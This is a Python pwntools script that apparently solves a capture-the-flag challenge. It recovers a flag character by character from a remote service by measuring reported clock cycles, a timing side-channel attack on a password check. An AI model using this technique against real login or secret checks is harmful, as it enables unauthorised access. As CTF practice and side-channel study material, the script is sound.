import string
import re
from statistics import mean, median, stdev
from collections import Counter
from pwn import *

# Connect to the remote service
s = remote('benchmark.challs.cyberchallenge.it', 9031)

# Define character set to try
CHARSET = string.ascii_letters + string.digits + string.punctuation

# Already known part of the password
known_password = "CCIT{"
password = known_password

# A potential modulus based on observed cycle patterns
MODULUS = 256  # 2^8


def try_password(s, password, retries=1):
    cycles_list = []

    for _ in range(retries):
        # Wait for the prompt
        s.recvuntil(b"check:")

        # Send password
        s.sendline(password.encode())

        # Receive response
        response = s.recvuntil(b"cycles").decode()

        # Extract clock cycles using regex
        match = re.search(r'checked in (\d+) clock cycles', response)
        if match:
            cycles = int(match.group(1))
            cycles_list.append(cycles)

            if "Correct" in response:
                return cycles, True

    # Calculate the average or take the max, depending on strategy
    if cycles_list:
        # Using median to reduce impact of outliers
        return median(cycles_list), False
    else:
        return 0, False


def analyze_modular_pattern(results, modulus=MODULUS):
    """Analyze results using modular arithmetic to find anomalies"""
    # Group by modular residue
    residues = {}
    for c, cycles, _ in results:
        residue = cycles % modulus
        if residue not in residues:
            residues[residue] = []
        residues[residue].append((c, cycles))

    # Find uncommon residues
    residue_counts = Counter([cycles % modulus for _, cycles, _ in results])
    avg_count = sum(residue_counts.values()) / len(residue_counts)

    # Look for residues that are rare or have unusually high cycle counts
    potential_chars = []

    # 1. Check for rare residues
    for residue, count in residue_counts.items():
        if count < avg_count * 0.5:  # Threshold for "rare"
            for c, cycles in residues[residue]:
                potential_chars.append((c, cycles, "rare_residue"))

    # 2. Within each residue class, check for outliers
    for residue, char_cycles in residues.items():
        if len(char_cycles) >= 3:  # Need enough samples to detect outliers
            cycle_values = [cycles for _, cycles in char_cycles]
            try:
                avg = mean(cycle_values)
                std = stdev(cycle_values)

                for c, cycles in char_cycles:
                    # Mark as outlier if more than 2 standard deviations above mean
                    if cycles > avg + 2 * std:
                        potential_chars.append((c, cycles, "outlier"))
            except:
                pass  # Not enough samples for meaningful statistics

    # 3. Just check for highest absolute cycle counts
    all_chars = [(c, cycles) for c, cycles, _ in results]
    all_chars.sort(key=lambda x: x[1], reverse=True)
    for c, cycles in all_chars[:5]:  # Top 5
        potential_chars.append((c, cycles, "highest"))

    # Remove duplicates while preserving order
    seen = set()
    unique_potential_chars = []
    for item in potential_chars:
        if item[0] not in seen:
            seen.add(item[0])
            unique_potential_chars.append(item)

    return unique_potential_chars


def find_next_char(password, retries=1):
    results = []

    print(f"Finding next character after '{password}'...")

    for c in CHARSET:
        test_password = password + c
        try:
            cycles, correct = try_password(s, test_password, retries)
            results.append((c, cycles, correct))

            # Check if we found the correct character
            if correct:
                print(f"Found correct character: '{c}' with {cycles} cycles")
                return c, True

            if c.isprintable():
                print(f"Tried: {test_password}, Cycles: {
                      cycles}, Correct: {correct}")

        except Exception as e:
            print(f"Error with {test_password}: {e}")

    # Analyze results using modular patterns
    potential_chars = analyze_modular_pattern(results)

    print("\nPotential characters based on timing analysis:")
    for c, cycles, reason in potential_chars[:10]:  # Show top 10
        print(f"Character: '{c}', Cycles: {cycles}, Reason: {reason}")

    # Return the most promising character
    if potential_chars:
        best_char = potential_chars[0][0]
        return best_char, False
    else:
        # Fallback to highest cycle count if analysis didn't yield candidates
        sorted_results = sorted(results, key=lambda x: x[1], reverse=True)
        if sorted_results:
            return sorted_results[0][0], False
        return None, False


# Main loop to find the complete flag
print(f"Starting with known prefix: {password}")
found_complete_flag = False

try:
    # Try to find remaining characters until we find a closing brace
    while not found_complete_flag:
        next_char, is_correct = find_next_char(password)

        if next_char:
            password += next_char
            print(f"Current password: {password}")

            if is_correct:
                found_complete_flag = True
                print(f"FOUND CORRECT FLAG: {password}")
                break

            # Check if we've found a closing brace
            if next_char == '}' and password.startswith(known_password):
                print(f"Found closing brace. Potential flag: {password}")
                # You may want to verify the full password here
                found_complete_flag = True
                break
        else:
            print("Failed to find next character. Something went wrong.")
            break

finally:
    # Close the connection
    s.close()
    print(f"Final result: {password}")
